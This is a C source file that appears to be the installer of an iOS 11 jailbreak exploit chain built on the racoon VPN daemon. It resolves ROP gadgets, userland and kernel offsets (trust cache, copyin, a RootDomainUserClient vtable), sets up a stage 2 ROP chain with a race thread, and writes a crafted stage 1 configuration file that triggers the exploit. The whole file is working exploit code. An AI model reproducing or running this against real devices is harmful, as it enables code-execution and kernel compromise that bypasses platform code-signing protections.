#include <fcntl.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include "common.h"
#include "stage1.h"
#include "stage2.h"
#include "uland_offsetfinder.h"
#include "../shared/realsym.h"
#include "../shared/jboffsets.h"
#include "img.h"
#include "patchfinder.h"
#include "generated/install_stage3_offsets.h"

// where all the implemented magic happens :P
int install(const char *config_path, const char *racoon_path, const char *dyld_cache_path)
{
#if J96_11_3_1
	// this basically just initalizes the myoffsets structure. THis is the only part that prevent the jailbreak from working on all devices/versions because the offsetfinders (I think mainly the kernel one) is still broken
	// so in theory you could also remove all the offsetfinders and just get the symbols by hand
	// For examples on how they look like, just look at the git history at some point there were no offsetfinders and all of this was hardcoded for a specific device (either ipad mini gen 4 wifi iOS 11.1.2 or 11.3.1)

	// init the userland offsetfinder implemented in uland_offsetfinder.m (thi will get all the gadgets for us)
	init_uland_offsetfinder(racoon_path,dyld_cache_path);

	// init the kernel offset finder (libjake)
	jake_img_t kernel_symbols = malloc(sizeof(jake_img));

	if (jake_init_image(kernel_symbols, "/System/Library/Caches/com.apple.kernelcaches/kernelcache")) {
		LOG("Patchfinder init failed\n");
		return -1;
	}

	offset_struct_t myoffsets;
	// for the symbol finder we need a string xref finder and some instruction decoding mechanism
	// we need to have some xref finder for code
	// For instruction decoding we need the b.gt instruction as well as the adr instruction and cbnz,cbz,blr and ldr

	// find the address of "No more than %d WINS" and "failed to set my ident %s" then an xref to the error handling code and then an xref which calls that code, for the first one you need to find an adr and for the second one you need an ldr
	myoffsets.dns4_array_to_lcconf = -((isakmp_cfg_config_addr()+0x28-4*8)-lcconf_addr()); 
	myoffsets.str_buff_offset = 8; // based on the pivot gadget below (the x21 gadget will do a double deref based on specific value on a buffer we control so we need to know it's offset)
	myoffsets.max_slide = get_cache_maxslide(); // just get 8 bytes at offset 30 from the cache
	myoffsets.slide_value = 0x4000; // hardcode that one
	myoffsets.pivot_x21 = (uint64_t)get_pivot_x21_gadget(); // I hope this doesn't change on any version but we need to find the same gadget on all version (gadget and byte seqeunce can be found in stage1.m)
	myoffsets.pivot_x21_x9_offset = 0x50-0x38; // this is not needed on 11.1.2 but because 11.3.1 and above lack the original x21 gadget we need to introduce that one here
	myoffsets.memmove = (uint64_t)memmove_cache_ptr(dyld_cache_path);  // strlcpy second branch
	myoffsets.lcconf_counter_offset = 0x10c; // we could try and find that dynamically or we could just hardcode it cause it prob doesn't change on 11.x (TODO: get that dynamically) (this is the offset of the counter variable in the lcconfig struct we use as a write what where primitive. It's used in some sub in racoon but it's hard to patchfind dynamically and as it doesn't change I just hardcoded it)
	myoffsets.cache_text_seg_size = 0x30000000; // we can get that by parsing the segments from the cache (but this is always enough)
	myoffsets.new_cache_addr = 0x1c0000000; // you might want to change this because it might not work on the 5S but it should be fine for us
	
	myoffsets.BEAST_GADGET = (uint64_t)get_beast_gadget(); // we can find that because it's part of a function and shouldn't change but it's basically also just byte matching cause if it would change the load order the whole framework would stop loading
	myoffsets.BEAST_GADGET_LOADER = myoffsets.BEAST_GADGET+4*9; // take the address above and search for the blr x27 and add 4
	myoffsets.BEAST_GADGET_CALL_ONLY = myoffsets.BEAST_GADGET+4*8; // take the address above and search for the blr x27
	myoffsets.str_x0_gadget = (uint64_t)get_str_x0_gadget(); // search for the byte sequence again (gadget in rop.h)
	myoffsets.str_x0_gadget_offset = 0x28; // based on the gadget above (at which offset it stores x0 basically)
	myoffsets.cbz_x0_gadget = (uint64_t)get_cbz_x0_gadget(); // search for the byte sequence (gadget in rop.h)
	myoffsets.cbz_x0_x16_load = (uint64_t)get_cbz_x0_x16_load((void*)myoffsets.cbz_x0_gadget); // decode the gadget above there will be a jump, follow that jump and decode the adrp and add there
	myoffsets.add_x0_gadget = (uint64_t)get_add_x0_gadget(); // raw byte search again (gadget is in rop.h)
	myoffsets.rop_nop = myoffsets.BEAST_GADGET+4*17; // just use the longjmp gadget above and search the ret instruction
	myoffsets.errno_offset = (uint64_t)get_errno_offset(dyld_cache_path); // we can get that by getting a raw syscall (for example __mmap, then searching for a branch following that and then searching for an adrp and a str)
	myoffsets.mach_msg_offset = 0x1f1535018; // don't know what this causes we need to figure it out later (basically I will mmap this address at the start of stage 2 otherwise it will at some point randomly crash in the mach_msg syscall. I don't have a good way to patchfinding this yet but as soon as you have a debugger setup you can generate stage 2 without the mmap call then get a crash and get far from the debugger (or cashlog) and put it here)
	
	myoffsets.longjmp = realsym(dyld_cache_path,"__longjmp"); // dlsym
	myoffsets.stack_pivot = (uint64_t)get_stackpivot_addr(dyld_cache_path); // longjmp from mov x2, sp
	myoffsets.open = realsym(dyld_cache_path,"_open"); // dlsym
	myoffsets.mmap = realsym(dyld_cache_path,"__mmap"); // dlsym of __mmap
	myoffsets.memcpy = realsym(dyld_cache_path,"_memcpy"); // dlsym
	myoffsets.fcntl_raw_syscall = realsym(dyld_cache_path,"__fcntl"); // raw bytes again (because it's a mov x16, <imm>, svc and that can't change)
	myoffsets.raw_mach_vm_remap_call = realsym(dyld_cache_path,"_mach_vm_remap");
	
	// kernel symbols/offsets below (iirc one of the struct offsets changed between iOS 11.1.2 and 11.3.1 so watch out for that)
	myoffsets.ipr_size = 8; // offset of the ipr_size field
	myoffsets.trust_chain_head_ptr = find_trustcache(kernel_symbols); // idk but I think the patchfinder can do that
	myoffsets.copyin = jake_find_symbol(kernel_symbols,"_copyin");
	myoffsets.gadget_add_x0_x0_ret = jake_find_symbol(kernel_symbols,"_csblob_get_cdhash");
	myoffsets.rootdomainUC_vtab = jake_find_symbol(kernel_symbols,"__ZTV20RootDomainUserClient");
	myoffsets.swapprefix_addr = find_swapprefix(kernel_symbols); // search for the string "/private/var/vm/swapfile" in the kernel that's the right address
	myoffsets.itk_registered = 0x2f0; // offset of the itk registered field
	myoffsets.is_task = 0x28; // offset of the is_task field
	
#else
	void* kernel_symbols = NULL;
	offset_struct_t myoffsets;
    // adr @ 0x100067c10
    // ldr @ 0x1000670e0
    myoffsets.dns4_array_to_lcconf = OFF_DNS4_ARRAY_TO_LCCONF;
    myoffsets.str_buff_offset = OFF_STR_BUFF;
    myoffsets.max_slide = OFF_MAX_SLIDE;
    myoffsets.slide_value = OFF_SLIDE_VALUE;
    myoffsets.pivot_x21 = OFF_PIVOT_X21;
    myoffsets.pivot_x21_x9_offset = OFF_PIVOT_X21_X9;
    myoffsets.memmove = OFF_MEMMOVE;
	myoffsets.lcconf_counter_offset = OFF_LCCONF_COUNTER;
	myoffsets.cache_text_seg_size = OFF_CACHE_TEXT_SEG_SIZE;
	myoffsets.new_cache_addr = OFF_NEW_CACHE_ADDR;

    myoffsets.BEAST_GADGET = OFF_BEAST_GADGET;
    myoffsets.BEAST_GADGET_LOADER = myoffsets.BEAST_GADGET+4*9;
    myoffsets.BEAST_GADGET_CALL_ONLY = myoffsets.BEAST_GADGET+4*8;
    myoffsets.str_x0_gadget = OFF_STR_X0_GADGET;
    myoffsets.str_x0_gadget_offset = OFF_STR_X0_GADGET_OFF;
    myoffsets.cbz_x0_gadget = OFF_CBZ_X0_GADGET;
    myoffsets.cbz_x0_x16_load = OFF_CBZ_X0_X16_LOAD;
    myoffsets.add_x0_gadget = OFF_ADD_X0_GADGET;
    myoffsets.rop_nop = myoffsets.BEAST_GADGET+4*17;
    myoffsets.errno_offset = OFF_ERRNO;
    myoffsets.mach_msg_offset = OFF_NDR_RECORD;
    
    myoffsets.longjmp = OFF_LONGJMP;
    myoffsets.stack_pivot = OFF_STACK_PIVOT;
    myoffsets.mmap = OFF_MMAP;
    myoffsets.memcpy = OFF_MEMCPY;
    myoffsets.open = OFF_OPEN;
    myoffsets.fcntl_raw_syscall = OFF_FCNTL_RAW;
    myoffsets.raw_mach_vm_remap_call = OFF_RAW_MACH_VM_REMAP;
    
    myoffsets.ipr_size = OFF_IPR_SIZE;
    myoffsets.trust_chain_head_ptr = OFF_TRUST_CACHE;
    myoffsets.copyin = OFF_COPYIN;
    myoffsets.gadget_add_x0_x0_ret = OFF_ADD_X0_X0_RET;
    myoffsets.rootdomainUC_vtab = OFF_ROOTDOMAINUC_VTAB; // iometa
    myoffsets.swapprefix_addr = OFF_SWAPPREFIX_ADDR;
    myoffsets.itk_registered = OFF_ITK_REGISTERED;
    myoffsets.is_task = OFF_IS_TASK;
#endif

	// myoffsets.stage1_ropchain is set by ROP_SETUP(offsets->stage1_ropchain) in stage1.m
	// myoffsets.stage2_ropchain is set by INIT_FRAMEWORK(offsets) in stage2.m
	myoffsets.stage2_base = myoffsets.new_cache_addr+myoffsets.cache_text_seg_size+0x4000; // just place stage 2 behind the remaped cache
	// myoffsets.stage2_size is set to chain_pos + 0x1000 in stage2.m
	myoffsets.stage2_max_size = 0x200000; // I hardcoded this, if stage 2 ever gets bigger than that you would need to adjust it
	myoffsets.thread_max_size = 0x10000; // there is a seperate thread in stage 2 (the race thread that spams the syscall and this is it's rop stack max size, so be careful when modifing it esp unrolling the loop more so that you never get passed this limit)
	// myoffsets.stage2_databuffer is set to malloc(offsets->stage2_databuffer_len) in stage2.m
	myoffsets.stage2_databuffer_len = 0x10000; // Moved from stage2.m
	myoffsets.stage2_barrier_buffer_size = 0x10000; // Moved from stage2.m
	myoffsets.stage3_fileoffset = 0; // at which place in the file (dylib) stage 3 (the code section) starts
	myoffsets.stage3_size = 0x10000; // get the file size and round at page boundary
	myoffsets.stage3_loadaddr = myoffsets.new_cache_addr-0x100000; // place stage 3 in front of the remaped cache

	// This has to update any time stage 3 is recompiled
    myoffsets.stage3_jumpaddr = myoffsets.stage3_loadaddr + STAGE3_JUMP;
	myoffsets.stage3_CS_blob = STAGE3_CSBLOB; 
	myoffsets.stage3_CS_blob_size = STAGE3_CSBLOB_SIZE;

	// generate stage 2 before stage 1 cause stage 1 needs to know the size of it
	stage2(kernel_symbols,&myoffsets,"/private/etc/racoon/");

	// generate stage 1
	if (mkdir("/var/run/racoon/", 0777) < 0 && errno != EEXIST) return errno;
	int f = open("/var/run/racoon/test.conf",O_WRONLY | O_CREAT,0644);
	stage1(f,&myoffsets);
	close(f);

	return 0;
}
